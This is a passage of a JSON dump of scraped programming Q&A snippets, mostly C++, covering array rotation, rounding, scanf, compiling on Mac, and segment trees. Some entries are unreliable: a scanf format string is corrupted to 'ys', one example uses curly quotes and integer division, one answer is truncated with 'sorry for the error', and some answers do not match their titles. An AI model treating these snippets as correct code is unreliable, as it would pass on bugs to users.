!ros::ok())   48       {   49         ROS_INFO(\"%s: Preempted\", action_name_.c_str());   50         // set the action state to preempted   51         as_.setPreempted();   52         success = false;   53         break;   54       }   55       feedback_.sequence.push_back(feedback_.sequence[i] + feedback_.sequence[i-1]);   56       // publish the feedback   57       as_.publishFeedback(feedback_);   58       // this sleep is not necessary, the sequence is computed at 1 Hz for demonstration purposes   59       r.sleep();   60     }   61    62     if(success)   63     {   64       result_.sequence = feedback_.sequence;   65       ROS_INFO(\"%s: Succeeded\", action_name_.c_str());   66       // set the action state to succeeded   67       as_.setSucceeded(result_);   68     }   69   }   70    71    72 };   73    74    75 int main(int argc, char** argv)   76 {   77   ros::init(argc, argv, \"fibonacci\");   78    79   FibonacciAction fibonacci(ros::this_node::getName());   80   ros::spin();   81    82   return 0;   83 } \n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3593,
    "keyword": null,
    "link": null,
    "title": " rotateArray",
    "description": "//term for how many time you want array to rotate void rotateArray(int arr [],int size,int term){     int i=0;     while(i<term){     int temp=arr[0];     for(int j=1;j<size;j++){         arr[j-1]=arr[j];     }     arr[size-1]=temp;     i++;     } }\n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3594,
    "keyword": null,
    "link": null,
    "title": " rotation 2d d'un point",
    "description": "x' = x . cos(a) &ndash; y . sin(a) y' = x . sin(a) + y . cos(a)\n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3595,
    "keyword": null,
    "link": null,
    "title": " round  c++",
    "description": "#include<bits/stdc++.h>  int main() { \tusing namespace std; \tios_base::sync_with_stdio(false), cin.tie(nullptr);  \tint T; cin >> T; \tfor (int case_num = 1; case_num <= T; case_num ++) {  \t\tint64_t L, R; cin >> L >> R; R++; \t\tbool parity = 0; \t\tint64_t coeff = 1; \t\tint64_t ans = 0; \t\twhile (L < R) { \t\t\tassert(1 <= L && L < R); \t\t\tauto is_good = [&](int64_t v) { \t\t\t\tassert(v > 0); \t\t\t\tbool d = v % 2; \t\t\t\twhile (v > 0) { \t\t\t\t\tif (v % 2 != d) return false; \t\t\t\t\td = !d; \t\t\t\t\tv /= 10; \t\t\t\t} \t\t\t\treturn d == 0; \t\t\t}; \t\t\twhile (L < R && L % 10 != 0) { \t\t\t\tif (is_good(L)) { \t\t\t\t\tans += coeff; \t\t\t\t} \t\t\t\tL++; \t\t\t} \t\t\twhile (L < R && R % 10 != 0) { \t\t\t\t--R; \t\t\t\tif (is_good(R)) { \t\t\t\t\tans += coeff; \t\t\t\t} \t\t\t}  \t\t\tif (L == R) break; \t\t\tassert(L % 10 == 0 && R % 10 == 0); \t\t\tassert(L >= 10);  \t\t\tL /= 10; sorry for the error \n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3596,
    "keyword": null,
    "link": null,
    "title": " round all columns in R dataframe to 3 digits",
    "description": "round_df <- function(x, digits) {     # round all numeric variables     # x: data frame      # digits: number of digits to round     numeric_columns <- sapply(x, mode) == 'numeric'     x[numeric_columns] <-  round(x[numeric_columns], digits)     x }  round_df(data, 3) \nlibrary(dplyr) df %>%   mutate_if(is.numeric, round) \n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3597,
    "keyword": null,
    "link": null,
    "title": " round double to 2 decimal places c++",
    "description": "float roundoff(float value, unsigned char prec) {   float pow_10 = pow(10.0f, (float)prec);   return round(value * pow_10) / pow_10; }  auto rounded = roundoff(100.123456, 3); // rounded = 100.123;\nvalue = round( value * 100.0 ) / 100.0; // 2 decimal places value = round( value * 1000.0 ) / 1000.0; // 3 decimal places\n float a,b,c,d,sum;   cin>>a>>b>>c>>d; // reading decimal values  sum=(a*b*c*d);  sum=round(sum*100)/100; // here it is for 2 decimal points  if((float)sum < (float) 9.58)   cout<<\"YES\\n\"; else   cout<<\"NO\\n\";   \ndouble d = 0.12345; std::cout.precision(2); // for accuracy to 2 decimal places  std::cout << d << std::endl; // 0.12\n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3598,
    "keyword": null,
    "link": null,
    "title": " round double to n decimal places c++",
    "description": "float roundoff(float value, unsigned char prec) {   float pow_10 = pow(10.0f, (float)prec);   return round(value * pow_10) / pow_10; }  auto rounded = roundoff(100.123456, 3); // rounded = 100.123;\nvalue = round( value * 100.0 ) / 100.0; // 2 decimal places value = round( value * 1000.0 ) / 1000.0; // 3 decimal places\n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3599,
    "keyword": null,
    "link": null,
    "title": " rounding off to nearest integer in c++",
    "description": " cout << \"Nearest value of x :\" << round(x) << \"\\n\"; \ndouble round(double x); float round(float x); long double round(long double x); double round(T x); // For integral type \n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3600,
    "keyword": null,
    "link": null,
    "title": " run c++ files on chrome book",
    "description": "1 sudo add-apt-repository ppa:jonathonf/vim 2 sudo apt update 3 sudo apt upgrade 4 sudo apt install vim\n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3601,
    "keyword": null,
    "link": null,
    "title": " run c++ in command prompt windows",
    "description": "#include <iostream> using namespace std;  int main() {     system(\"DATE\");     return 0; }\n            /* Run C++ in cmd */ 1. Download, install the compilerand and edit Environment Variables.    2. Type the C/C++ program and save it.    3. Open the command line and change directory to the particular one where  the source file is stored  4. To compile, type in the command prompt: //an exe file will be generated         gcc sourcefile_name.c -o outputfile.exe Ex: gcc HelloWorld.c -o HelloWorld.exe    5. To run the code, type:         outputfile.exe Ex: HelloWorld.exe\n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3602,
    "keyword": null,
    "link": null,
    "title": " run c++ program in mac terminal",
    "description": "g++ sort.cpp -o sort ./sort\n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3603,
    "keyword": null,
    "link": null,
    "title": " run c++ program mac",
    "description": "gcc main.cpp -o main.out   ./main.out \n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3604,
    "keyword": null,
    "link": null,
    "title": " run cmd command c++",
    "description": "#include <iostream> using namespace std;  int main() {     system(\"DATE\");     return 0; }\n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3605,
    "keyword": null,
    "link": null,
    "title": " run cpp code",
    "description": "# Open Terminal:   # Type:  g++ --version  # If the command is not recognized:  sudo apt-get install g++  g++ --version # should work now   # If the command is recognized mkdir tmp  cd tmp  touch main.cpp  # open main.cpp using vi, vim, gedit, etc # Type in a hello world program:  # https://www.tutorialspoint.com/cplusplus-hello-world-program  # Once this has been done, type in:  g++ main.cpp ./a.out \nOnline compiler available it would run cpp program for you online.\n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3606,
    "keyword": null,
    "link": null,
    "title": " run program until ctrl-d  c++",
    "description": "std::string line;  while (std::getline(std::cin, line)) {     std::cout << line << std::endl; }\n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3607,
    "keyword": null,
    "link": null,
    "title": " running a c++ program in visual studio code cannot edit in read only editor",
    "description": "File > Prefrences >Setting   type : run code   scroll until you get code-runner and check on the \"Whether to run code in integrated terminal\" restart vscode  \n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3608,
    "keyword": null,
    "link": null,
    "title": " runtime error in c++",
    "description": " Runtime errors indicate bugs in the program or problems that the designers had anticipated but could do nothing about.\n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3609,
    "keyword": null,
    "link": null,
    "title": " s.find c++reference",
    "description": "// find example #include <iostream>     // std::cout #include <algorithm>    // std::find #include <vector>       // std::vector  int main () {   // using std::find with array and pointer:   int myints[] = { 10, 20, 30, 40 };   int * p;    p = std::find (myints, myints+4, 30);   if (p != myints+4)     std::cout << \"Element found in myints: \" << *p << '\\n';   else     std::cout << \"Element not found in myints\\n\";    // using std::find with vector and iterator:   std::vector<int> myvector (myints,myints+4);   std::vector<int>::iterator it;    it = find (myvector.begin(), myvector.end(), 30);   if (it != myvector.end())     std::cout << \"Element found in myvector: \" << *it << '\\n';   else     std::cout << \"Element not found in myvector\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3610,
    "keyword": null,
    "link": null,
    "title": " sacnf in c",
    "description": "/* scanf example */ #include <stdio.h>  int main () {   char str [80];   int i;    printf (\"Enter your family name: \");   scanf (\"ys\",str);     printf (\"Enter your age: \");   scanf (\"%d\",&i);   printf (\"Mr. %s , %d years old.\\n\",str,i);   printf (\"Enter a hexadecimal number: \");   scanf (\"%x\",&i);   printf (\"You have entered %#x (%d).\\n\",i,i);      return 0; }\n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3611,
    "keyword": null,
    "link": null,
    "title": " sass set variable if not defined",
    "description": "$content: \"First content\"; $content: \"Second content?\" !default; $new_content: \"First time reference\" !default;  #main {   content: $content;   new-content: $new_content; }  /*   * Compiles to  * #main {  *   content: \"First content\";  *   new-content: \"First time reference\"; }  */\n",
    "reg_date": "2021-10-12T11:43:11.000Z"
  },
  {
    "id": 3612,
    "keyword": null,
    "link": null,
    "title": " scan c++",
    "description": "#include <stdio.h>  int main() {     int a, b, c;     printf(\"Enter the first value:\");     scanf(\"%d\", &a);     printf(\"Enter the second value:\");     scanf(\"%d\", &b);     c = a + b;     printf(\"%d + %d = %d\\n\", a, b, c);     return 0; } \n/* scanf example */ #include <stdio.h>  int main () {   char str [80];   int i;    printf (\"Enter your family name: \");   scanf (\"ys\",str);     printf (\"Enter your age: \");   scanf (\"%d\",&i);   printf (\"Mr. %s , %d years old.\\n\",str,i);   printf (\"Enter a hexadecimal number: \");   scanf (\"%x\",&i);   printf (\"You have entered %#x (%d).\\n\",i,i);      return 0; }\n#include <stdio.h> int main(){ int x1,x2,x3,x4,x5; \tfloat mean; \tprintf(&ldquo;Input 5 Number::&rdquo;); \tscanf(&ldquo;%d %d %d %d %d&rdquo;,&x1,&x2,&x3,&x4,&x5); \tmean=(x1+x2+x3+x4+x5)/5; \tprintf(&ldquo;%.3f&rdquo;,mean); \tgetche(); }\n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3613,
    "keyword": null,
    "link": null,
    "title": " scientific word for pig",
    "description": "PIG LOOKING KINDA SUS O_O\nsus :)\nint main() {   printf(\"Sus\"); }\n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3614,
    "keyword": null,
    "link": null,
    "title": " scope resolution operator in c++",
    "description": ":: // this is called the scope resolution operator.  The :: (scope resolution) operator is used to qualify hidden names so that you can still use them \n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3615,
    "keyword": null,
    "link": null,
    "title": " scramble string memoised",
    "description": "int Solution::isScramble(const string s1, const string s2) {     int len = s1.size();     bool dp[len + 1][len + 1][len + 1];     memset(dp, 0, sizeof(dp));      for (int i = len - 1; i >= 0; i--) {         for (int j = len - 1; j >= 0; j--) {             dp[i][j][1] = (s1[i] == s2[j]);             for (int l = 2; i + l <= len && j + l <= len; l++) {                 for (int n = 1; n < l; n++) {                     dp[i][j][l] |= dp[i][j][n] && dp[i + n][j + n][l - n];                     dp[i][j][l] |= dp[i][j + l - n][n] && dp[i + n][j][l - n];                 }             }         }     }     return dp[0][0][len]; }\n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3616,
    "keyword": null,
    "link": null,
    "title": " screen record ios simulator",
    "description": "// when iOS simulator is running xcrun simctl io booted recordVideo <filename>.<file extension>\n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3617,
    "keyword": null,
    "link": null,
    "title": " sdfsf",
    "description": " Notification ID ss\n Notification ID \n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3618,
    "keyword": null,
    "link": null,
    "title": " sdl window full screen",
    "description": "int SDL_SetWindowFullscreen(SDL_Window* window,                             Uint32      flags) \n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3619,
    "keyword": null,
    "link": null,
    "title": " search in vector of pairs c++",
    "description": "bool isEqual(const std::pair<std::string, int>& element) {     return element.first ==  User.name; } it = std::find_if( sortList.begin(), sortList.end(), isEqual ); \nauto it = std::find_if( sortList.begin(), sortList.end(),     [&User](const std::pair<std::string, int>& element){ return element.first == User.name;} ); \n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3620,
    "keyword": null,
    "link": null,
    "title": " searching display insert in a binary serach tree",
    "description": "#include <iostream>  using namespace std; class node { public:     int data;     node*right;     node*left; }; node*getnewnode(int val) {     node *temp=new node;     temp->data=val;     temp->left=NULL;     temp->right=NULL;    return temp; } node*insertbst(node*root,int val) {     if(root==NULL)     {         return getnewnode(val);     }     if(root->data>val)     {         root->left= insertbst(root->left,val);     }     else     {         root->right= insertbst(root->right,val);     }     return root; } int searchbst(node*root,int val) {     if(root==NULL)     {         return 0;     }     if(root->data==val)     {         return 1;     }     if(root->data<val)     {         return searchbst(root->right,val);     }     else     {         return searchbst(root->left,val);     } } void inorder(node*root) {     if(root==NULL)     {         return;     }     inorder(root->left);     cout<<root->data<<\" \";     inorder(root->right); } int main() {     node*root=new node;     root=NULL;     while(1)     {         int value;         cout<<\"1.Insert to bst\"<<endl<<\"2.search in bst:\"<<endl<<\"3.display ordered bst\"<<endl<<\"4. exit\"<<endl;         int n;         cout<<\"enter your choice:\"<<endl;         cin>>n;         switch(n)         {         case 1:             {                 cout<<\"enter the value to be inserted:\"<<endl;                 cin>>value;                 root=insertbst(root,value);                 break;             }         case 2:             {                 cout<<\"enter the value you want to search:\"<<endl;                 int search;                 cin>>search;                 int s=searchbst(root,search);                 if(s==1)                 {                     cout<<\"value found\"<<endl;                 }                 else                 {                     cout<<\"value not found:\"<<endl;                 }                 break;             }         case 3:             {                 inorder(root);                 cout<<endl;                 break;             }         case 4:             {                 exit(0);             }         default:             {                 cout<<\"invalid choice given:\"<<endl;             }          }     }     return 0; } \n",
    "reg_date": "2021-10-12T11:43:12.000Z"
  },
  {
    "id": 3621,
    "keyword": null,
    "link": null,
    "title": " second maximum number in array c++",
    "description": "#include <iostream> int main() {     std::cout << \"Enter 5 numbers : \";     int arr[5];          for (int i = 0; i < 5; std::cin >> arr[i++]);      int max = arr[0], second = 0;      for (int i = 1; i < 5; i++)         if (arr[i] > max)             max = arr[i];     std::cout << \"Maximum number : \" << max << \"\\n\";     bool found = false;     for (int i = 0; i < 5; i++)     {         if (arr[i] == max)             continue;         else if (arr[i] > second)         {             second = arr[i];             found = true;         }     }     if (found)         std::cout << \"Second maximum numbers : \" << second;     else         std::cout << \"Second maximum number not found.\"; }\n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3622,
    "keyword": null,
    "link": null,
    "title": " seed random c++",
    "description": "#include<iostream> #include<cstdlib> using namespace std;  int main() { \tint random = rand(); \t/* No srand() calls before rand(), so seed = 1*/ \tcout << \"Seed = 1, Random number = \" << random << endl;  \tsrand(5); \t/* Seed = 5 */ \trandom = rand(); \tcout << \"Seed = 5, Random number = \" << random << endl;  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3623,
    "keyword": null,
    "link": null,
    "title": " segment tree",
    "description": "// C++ program to show segment tree operations like construction, query  // and update  #include <bits/stdc++.h>  using namespace std;   // A utility function to get the middle index from corner indexes.  int getMid(int s, int e) { return s + (e -s)/2; }   /* A recursive function to get the sum of values in the given range  \tof the array. The following are parameters for this function.   \tst --> Pointer to segment tree  \tsi --> Index of current node in the segment tree. Initially  \t\t\t0 is passed as root is always at index 0  \tss & se --> Starting and ending indexes of the segment represented  \t\t\t\tby current node, i.e., st[si]  \tqs & qe --> Starting and ending indexes of query range */ int getSumUtil(int *st, int ss, int se, int qs, int qe, int si)  {  \t// If segment of this node is a part of given range, then return  \t// the sum of the segment  \tif (qs <= ss && qe >= se)  \t\treturn st[si];   \t// If segment of this node is outside the given range  \tif (se < qs || ss > qe)  \t\treturn 0;   \t// If a part of this segment overlaps with the given range  \tint mid = getMid(ss, se);  \treturn getSumUtil(st, ss, mid, qs, qe, 2*si+1) +  \t\tgetSumUtil(st, mid+1, se, qs, qe, 2*si+2);  }   /* A recursive function to update the nodes which have the given  index in their range. The following are parameters  \tst, si, ss and se are same as getSumUtil()  \ti --> index of the element to be updated. This index is  \t\t\tin the input array.  diff --> Value to be added to all nodes which have i in range */ void updateValueUtil(int *st, int ss, int se, int i, int diff, int si)  {  \t// Base Case: If the input index lies outside the range of  \t// this segment  \tif (i < ss || i > se)  \t\treturn;   \t// If the input index is in range of this node, then update  \t// the value of the node and its children  \tst[si] = st[si] + diff;  \tif (se != ss)  \t{  \t\tint mid = getMid(ss, se);  \t\tupdateValueUtil(st, ss, mid, i, diff, 2*si + 1);  \t\tupdateValueUtil(st, mid+1, se, i, diff, 2*si + 2);  \t}  }   // The function to update a value in input array and segment tree.  // It uses updateValueUtil() to update the value in segment tree  void updateValue(int arr[], int *st, int n, int i, int new_val)  {  \t// Check for erroneous input index  \tif (i < 0 || i > n-1)  \t{  \t\tcout<<\"Invalid Input\";  \t\treturn;  \t}   \t// Get the difference between new value and old value  \tint diff = new_val - arr[i];   \t// Update the value in array  \tarr[i] = new_val;   \t// Update the values of nodes in segment tree  \tupdateValueUtil(st, 0, n-1, i, diff, 0);  }   // Return sum of elements in range from index qs (quey start)  // to qe (query end). It mainly uses getSumUtil()  int getSum(int *st, int n, int qs, int qe)  {  \t// Check for erroneous input values  \tif (qs < 0 || qe > n-1 || qs > qe)  \t{  \t\tcout<<\"Invalid Input\";  \t\treturn -1;  \t}   \treturn getSumUtil(st, 0, n-1, qs, qe, 0);  }   // A recursive function that constructs Segment Tree for array[ss..se].  // si is index of current node in segment tree st  int constructSTUtil(int arr[], int ss, int se, int *st, int si)  {  \t// If there is one element in array, store it in current node of  \t// segment tree and return  \tif (ss == se)  \t{  \t\tst[si] = arr[ss];  \t\treturn arr[ss];  \t}   \t// If there are more than one elements, then recur for left and  \t// right subtrees and store the sum of values in this node  \tint mid = getMid(ss, se);  \tst[si] = constructSTUtil(arr, ss, mid, st, si*2+1) +  \t\t\tconstructSTUtil(arr, mid+1, se, st, si*2+2);  \treturn st[si];  }   /* Function to construct segment tree from given array. This function  allocates memory for segment tree and calls constructSTUtil() to  fill the allocated memory */ int *constructST(int arr[], int n)  {  \t// Allocate memory for the segment tree   \t//Height of segment tree  \tint x = (int)(ceil(log2(n)));   \t//Maximum size of segment tree  \tint max_size = 2*(int)pow(2, x) - 1;   \t// Allocate memory  \tint *st = new int[max_size];   \t// Fill the allocated memory st  \tconstructSTUtil(arr, 0, n-1, st, 0);   \t// Return the constructed segment tree  \treturn st;  }   // Driver program to test above functions  int main()  {  \tint arr[] = {1, 3, 5, 7, 9, 11};  \tint n = sizeof(arr)/sizeof(arr[0]);   \t// Build segment tree from given array  \tint *st = constructST(arr, n);   \t// Print sum of values in array from index 1 to 3  \tcout<<\"Sum of values in given range = \"<<getSum(st, n, 1, 3)<<endl;   \t// Update: set arr[1] = 10 and update corresponding  \t// segment tree nodes  \tupdateValue(arr, st, n, 1, 10);   \t// Find sum after the value is updated  \tcout<<\"Updated sum of values in given range = \" \t\t\t<<getSum(st, n, 1, 3)<<endl;  \treturn 0;  }  //This code is contributed by rathbhupendra  \nconst int N = 1e5;  // limit for array size int n;  // array size int t[2 * N];  void build() {  // build the tree   \tfor (int i = n - 1; i > 0; --i) t[i] = t[i<<1] + t[i<<1|1]; }  void modify(int p, int value) {  // set value at position p   \tfor (t[p += n] = value; p > 1; p >>= 1) t[p>>1] = t[p] + t[p^1]; }  int query(int l, int r) {  // sum on interval [l, r)     int res = 0;     for (l += n, r += n; l < r; l >>= 1, r >>= 1) {         if (l&1) res += t[l++];         if (r&1) res += t[--r];     }     return res; }  int main() { \tstd::cin>>n;     for (int i = 0; i < n; ++i) std::cin>>t[n+i];     build();     modify(0, 1);     std::cout<<query(3, 11)<<'\\n';     return 0; }\n// General Segment Tree struct // Original source: https://codeforces.com/blog/entry/18051  template<class T> struct SegTree {      int size;     T defVal;     vector<T> tree;     T (*op)(T, T);          SegTree (int size, T defVal, T (*op)(T, T))         : size(size), defVal(defVal), tree(vector<T>(2*size)), op(op) {}     SegTree (vector<T> v, T defVal, T (*op)(T, T))         : SegTree(v.size()/2, defVal, op) {         for (int i = 0; i<size; ++i) {             tree[i+size] = v[i];         }         build();     }      void build() {          for (int i = size-1; i>0; --i) {             tree[i] = op(tree[i<<1], tree[i<<1|1]);         }      }     T query (int l, int r) {          l += size, r += size+1;         T res;         for (res = defVal; l<r; l >>= 1, r >>= 1) {             if (l&1) res = op(res, tree[l++]);             if (r&1) res = op(res, tree[--r]);         }         return res;      }     void update (int i, T val) {          i += size;         for (tree[i] = val; i>1; i >>= 1) {             tree[i>>1] = op(tree[i], tree[i^1]);         }      }  };\n//Given size of array,array elements and no. of queries along with the range l,r find the minimum value in the range #include<bits/stdc++.h> using namespace std; int build_segment_tree(int arr[],int start,int end,int *st,int index) {     if(start==end)     {         st[index]=arr[start];         return arr[start];     }     int mid=(start+end)/2;     st[index]=min(build_segment_tree(arr,start,mid,st,2*index+1),build_segment_tree(arr,mid+1,end,st,2*index+2));     return st[index]; } int* construct_seg_tree(int arr[],int n) {     int height=(int)(ceil(log2(n)));     int max_length=2*(int)pow(2,height)-1;     int* segtree=new int[max_length];     build_segment_tree(arr,0,n-1,segtree,0);     return segtree; } int range_query_min(int* st,int start,int end, int l,int r,int index) {     if(l>=start&&r<=end)//total overlap     {         return st[index];     }     else if(l>end||r<start)     {         return INT_MAX;     }     else     {         int mid=(start+end)/2;         return min(range_query_min(st,start,mid,l,r,2*index+1),range_query_min(st,mid+1,end,l,r,2*index+2));     } } int range_query(int *st,int start,int end,int l,int r,int index) {     if(l<0||r>end-1||l>r)     {         cout<<\"Enter a valid range\"<<endl;         return -1;     }     return range_query_min(st,0,end-1,l,r,0); } int main() {     int n;     cout<<\"enter the size of array\"<<endl;     cin>>n;     int arr[n];     cout<<\"Enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     int *segment=construct_seg_tree(arr,n);     cout<<\"enter the query range\"<<endl;     int l,r;     cin>>l>>r;     cout<<range_query(segment,0,n,l,r,0);     return 0; } \nvoid build(int node, int start, int end) {     if(start == end)     {         // Leaf node will have a single element         tree[node] = A[start];     }     else     {         int mid = (start + end) / 2;         // Recurse on the left child         build(2*node, start, mid);         // Recurse on the right child         build(2*node+1, mid+1, end);         // Internal node will have the sum of both of its children         tree[node] = tree[2*node] + tree[2*node+1];     } }\n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3624,
    "keyword": null,
    "link": null,
    "title": " segment tree complexity",
    "description": "// C++ program to show segment tree operations like construction, query  // and update  #include <bits/stdc++.h>  using namespace std;   // A utility function to get the middle index from corner indexes.  int getMid(int s, int e) { return s + (e -s)/2; }   /* A recursive function to get the sum of values in the given range  \tof the array. The following are parameters for this function.   \tst --> Pointer to segment tree  \tsi --> Index of current node in the segment tree. Initially  \t\t\t0 is passed as root is always at index 0  \tss & se --> Starting and ending indexes of the segment represented  \t\t\t\tby current node, i.e., st[si]  \tqs & qe --> Starting and ending indexes of query range */ int getSumUtil(int *st, int ss, int se, int qs, int qe, int si)  {  \t// If segment of this node is a part of given range, then return  \t// the sum of the segment  \tif (qs <= ss && qe >= se)  \t\treturn st[si];   \t// If segment of this node is outside the given range  \tif (se < qs || ss > qe)  \t\treturn 0;   \t// If a part of this segment overlaps with the given range  \tint mid = getMid(ss, se);  \treturn getSumUtil(st, ss, mid, qs, qe, 2*si+1) +  \t\tgetSumUtil(st, mid+1, se, qs, qe, 2*si+2);  }   /* A recursive function to update the nodes which have the given  index in their range. The following are parameters  \tst, si, ss and se are same as getSumUtil()  \ti --> index of the element to be updated. This index is  \t\t\tin the input array.  diff --> Value to be added to all nodes which have i in range */ void updateValueUtil(int *st, int ss, int se, int i, int diff, int si)  {  \t// Base Case: If the input index lies outside the range of  \t// this segment  \tif (i < ss || i > se)  \t\treturn;   \t// If the input index is in range of this node, then update  \t// the value of the node and its children  \tst[si] = st[si] + diff;  \tif (se != ss)  \t{  \t\tint mid = getMid(ss, se);  \t\tupdateValueUtil(st, ss, mid, i, diff, 2*si + 1);  \t\tupdateValueUtil(st, mid+1, se, i, diff, 2*si + 2);  \t}  }   // The function to update a value in input array and segment tree.  // It uses updateValueUtil() to update the value in segment tree  void updateValue(int arr[], int *st, int n, int i, int new_val)  {  \t// Check for erroneous input index  \tif (i < 0 || i > n-1)  \t{  \t\tcout<<\"Invalid Input\";  \t\treturn;  \t}   \t// Get the difference between new value and old value  \tint diff = new_val - arr[i];   \t// Update the value in array  \tarr[i] = new_val;   \t// Update the values of nodes in segment tree  \tupdateValueUtil(st, 0, n-1, i, diff, 0);  }   // Return sum of elements in range from index qs (quey start)  // to qe (query end). It mainly uses getSumUtil()  int getSum(int *st, int n, int qs, int qe)  {  \t// Check for erroneous input values  \tif (qs < 0 || qe > n-1 || qs > qe)  \t{  \t\tcout<<\"Invalid Input\";  \t\treturn -1;  \t}   \treturn getSumUtil(st, 0, n-1, qs, qe, 0);  }   // A recursive function that constructs Segment Tree for array[ss..se].  // si is index of current node in segment tree st  int constructSTUtil(int arr[], int ss, int se, int *st, int si)  {  \t// If there is one element in array, store it in current node of  \t// segment tree and return  \tif (ss == se)  \t{  \t\tst[si] = arr[ss];  \t\treturn arr[ss];  \t}   \t// If there are more than one elements, then recur for left and  \t// right subtrees and store the sum of values in this node  \tint mid = getMid(ss, se);  \tst[si] = constructSTUtil(arr, ss, mid, st, si*2+1) +  \t\t\tconstructSTUtil(arr, mid+1, se, st, si*2+2);  \treturn st[si];  }   /* Function to construct segment tree from given array. This function  allocates memory for segment tree and calls constructSTUtil() to  fill the allocated memory */ int *constructST(int arr[], int n)  {  \t// Allocate memory for the segment tree   \t//Height of segment tree  \tint x = (int)(ceil(log2(n)));   \t//Maximum size of segment tree  \tint max_size = 2*(int)pow(2, x) - 1;   \t// Allocate memory  \tint *st = new int[max_size];   \t// Fill the allocated memory st  \tconstructSTUtil(arr, 0, n-1, st, 0);   \t// Return the constructed segment tree  \treturn st;  }   // Driver program to test above functions  int main()  {  \tint arr[] = {1, 3, 5, 7, 9, 11};  \tint n = sizeof(arr)/sizeof(arr[0]);   \t// Build segment tree from given array  \tint *st = constructST(arr, n);   \t// Print sum of values in array from index 1 to 3  \tcout<<\"Sum of values in given range = \"<<getSum(st, n, 1, 3)<<endl;   \t// Update: set arr[1] = 10 and update corresponding  \t// segment tree nodes  \tupdateValue(arr, st, n, 1, 10);   \t// Find sum after the value is updated  \tcout<<\"Updated sum of values in given range = \" \t\t\t<<getSum(st, n, 1, 3)<<endl;  \treturn 0;  }  //This code is contributed by rathbhupendra  \nvoid build(int node, int start, int end) {     if(start == end)     {         // Leaf node will have a single element         tree[node] = A[start];     }     else     {         int mid = (start + end) / 2;         // Recurse on the left child         build(2*node, start, mid);         // Recurse on the right child         build(2*node+1, mid+1, end);         // Internal node will have the sum of both of its children         tree[node] = tree[2*node] + tree[2*node+1];     } }\nclass SegmentTree{ public:     vector<int> segv;     int n;     SegmentTree(vector<int> &nums) {         if (!nums.size()) return ;         segv.assign(nums.size() * 4, 0);         n = nums.size();         build(nums, 1, 0, n - 1);      }     void build(vector<int> &nums, int v, int l, int r) {         if (l == r) segv[v] = nums[l];         else {             int mid = l + (r - l) / 2;             build(nums, v * 2, l, mid);             build(nums, v * 2 + 1, mid + 1, r);             segv[v] = segv[v * 2] + segv[v * 2 + 1];          }     }     int sumRange(int v, int l, int r, int a, int b) {         if (a > b) return 0;         if (l == a && r == b) return segv[v];         int mid = l + (r - l) / 2;         return sumRange(v * 2, l, mid, a, min(mid, b))             + sumRange(v * 2 + 1, mid + 1, r, max(mid + 1, a), b);     }     void update(int v, int l, int r, int pos, int val) {         if (l == r) segv[v] = val;         else {             int mid = l + (r - l) / 2;             if (pos <= mid) update(v * 2, l, mid, pos, val);             else update(v * 2 + 1, mid + 1, r, pos, val);             segv[v] = segv[v * 2] + segv[v * 2 + 1];         }     }     int sumRange(int a, int b) {         return sumRange(1, 0, n - 1, a, b);     }     void update(int pos, int val) {         update(1, 0, n - 1, pos, val);     } };\n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3625,
    "keyword": null,
    "link": null,
    "title": " segmentation fault means",
    "description": "A segmentation fault (aka segfault) is a common condition that causes programs to crash; they are often associated with a file named core.  Segfaults are caused by a program trying to read or write an illegal memory location\nSegfaults are caused by a program trying to read or write an illegal memory location\n## Segmentation Fault ##  when it will come ? READ Conditions below ...  - segmentation fault comes when you have an array of 10 size and   you are accessing the arr[12] so you are accessing the unknown memory   which is not yours so it will gives you error...    - If you are asking for memory but it doesnt have any memory left so error...  ...so both conditions above will gives you error as segmentation fault.\n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3626,
    "keyword": null,
    "link": null,
    "title": " select elements from array C++",
    "description": "double X[100];  for (int i = 0; i < 98; i++) {   X[i+1] = r*X[i]*(1.0-X[i]);   myfile << X[i] << endl; }\n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3627,
    "keyword": null,
    "link": null,
    "title": " select one random element of a vector in c++",
